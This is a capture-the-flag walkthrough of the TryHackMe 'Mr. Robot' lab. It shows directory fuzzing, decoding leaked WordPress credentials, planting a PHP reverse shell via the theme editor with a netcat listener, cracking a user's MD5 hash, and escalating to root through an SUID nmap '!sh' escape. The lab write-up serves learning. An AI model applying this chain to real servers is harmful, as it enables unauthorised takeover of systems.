# Try Hack Me - Mr. Robot
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 
# Vulnerabilities:

# Phase 1 - Reconnaissance:
nmap scan: 
```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

lets start enumerating the webpage at port 80. nothing much interesting on this port, just a mr robot themed terminal. lets fuzz the directories to find anything useful.

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/commmon.txt
```
`/.hta                 (Status: 403) [Size: 213]`

`/.htaccess            (Status: 403) [Size: 218]`

`/.htpasswd            (Status: 403) [Size: 218]`

`/0                    (Status: 301) [Size: 0] `

`/admin                (Status: 301) [Size: 233]`

`/atom                 (Status: 301) [Size: 0]`

`/audio                (Status: 301) [Size: 233]`

`/blog                 (Status: 301) [Size: 232] `

`/css                  (Status: 301) [Size: 231]` 

`/dashboard            (Status: 302) [Size: 0] `

`/favicon.ico          (Status: 200) [Size: 0]`

`/feed                 (Status: 301) [Size: 0] `

`/image                (Status: 301) [Size: 0]`

`/Image                (Status: 301) [Size: 0]`

`/images               (Status: 301) [Size: 234]`

`/index.html           (Status: 200) [Size: 1158]`

`/index.php            (Status: 301) [Size: 0] `

`/intro                (Status: 200) [Size: 516314]`

`/js                   (Status: 301) [Size: 230]`

`/license              (Status: 200) [Size: 309]`

`/login                (Status: 302) [Size: 0]`

`/page1                (Status: 301) [Size: 0] `

`/phpmyadmin           (Status: 403) [Size: 94]`

`/rdf                  (Status: 301) [Size: 0] `

`/readme               (Status: 200) [Size: 64]`

`/robots.txt           (Status: 200) [Size: 41]`

`/robots               (Status: 200) [Size: 41]`

`/rss                  (Status: 301) [Size: 0] `

`/rss2                 (Status: 301) [Size: 0] `

`/sitemap              (Status: 200) [Size: 0]`

`/sitemap.xml          (Status: 200) [Size: 0]`

`/video                (Status: 301) [Size: 233] `

`/wp-admin             (Status: 301) [Size: 236] `

`/wp-content           (Status: 301) [Size: 238]` 

`/wp-config            (Status: 200) [Size: 0]`

`/wp-cron              (Status: 200) [Size: 0]`

`/wp-includes          (Status: 301) [Size: 239]`

`/wp-load              (Status: 200) [Size: 0]`

`/wp-login             (Status: 200) [Size: 2599]`

`/wp-links-opml        (Status: 200) [Size: 227]`

`/wp-mail              (Status: 500) [Size: 3074]`

`/wp-settings          (Status: 500) [Size: 0]`

`/wp-signup            (Status: 302) [Size: 0] `

`/xmlrpc               (Status: 405) [Size: 42]`

`/xmlrpc.php           (Status: 405) [Size: 42]`

this looks like a standard wordpress website. lets visit the /robots.txt to get some leads.

![robots](https://github.com/realatharva15/mr_robot_writeup/blob/main/images/robots.png)

as you can see we get the location of key1. lets navigate to file and submit it. we also find a wordlist named fsocity.dic which could help us in the future to bruteforce some password maybe.

now we move on to the /wp-login directory to try to get the access of the admin dashboard. we can easily get a reverse shell using the theme editor. lets use wpscan to scan all possible users and later on bruteforce their passwords. sadly no luck with wpscan. so i decided to manually visit every directory in the search of finding credentials or even the slightlest hints

after visiting the /license directory, i found a reference to that one episode when Elliot scolds Darlene for being a script kiddie when she wrote an exploit within 4 hours or something. but wait, we can scroll down!

![scriptkitty](https://github.com/realatharva15/mr_robot_writeup/blob/main/images/scriptkiddy.png)

after scrolling down we find a base64 encoded string which might be the credentials! 

![password](https://github.com/realatharva15/mr_robot_writeup/blob/main/images/password.png)

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
```
we find eliot's wordpress password! lets use this to login. and just like that we have a dashboard as elliot. now lets navigate to the appearance tab and then to the editor section. now select the 404 template. replace the contents with a php reverse shell. 

![phpreverseshell](https://github.com/realatharva15/mr_robot_writeup/blob/main/images/404.png)

now once we have uploaded we will start a netcat listener.

```bash
nc -lnvp 4444
```
now lets trigger the reverseshell by visiting the location where the template is uploaded.

```bash
# in your browser:
http://<target_ip>/wp-content/themes/twentyfifteen/404.php
```
we have a shell as daemon! lets quickly navigate to the home directory and search for some more clues and keys. turns ut we need to get a shell as robot to be able to access the key2. but wait! there is a password hash of robot present in his own directory. lets use john the ripper to crack the hash. rockyou.txt could not crack the hash whatsoever. remember the fsocity.dic wordlist we found earlier? maybe that could be the wordlist to crack this password.

```bash
john --format=raw-md5 --wordlist=fsocity.dic robot_hash
```
![johnny](https://github.com/realatharva15/mr_robot_writeup/blob/main/images/johnny.png)

surprisingly the password which gets cracked is in all caps. also it is the last word from the wordlist. turns out it is not the password. lets use crackstation to crack the hash. 

![crack](https://github.com/realatharva15/mr_robot_writeup/blob/main/images/crack.png)

we get the actual password of user robot! lets login as robot and submit the key2.

now i checked the privileges of the robot user and it does not have any privileges to run sudo, so our second best bet would be finding an unusual SUID.

```bash
find / -type f -perm -4000 2>/dev/null
```
we find this sus looking nmap SUID.

`/usr/local/bin/nmap`

after checking out GTFO bins, i found out that this version of nmap(v.3.8.1) is vulnerable to a direct shell execution. lets quickly use that exploit

```bash
nmap --interactive
#once you get an interactive shell, paste this:
!sh
```
![rooted](https://github.com/realatharva15/mr_robot_writeup/blob/main/images/rooted.png)

and just like that we have rooted Mr. Robot! we will read and submit the key3 flag.

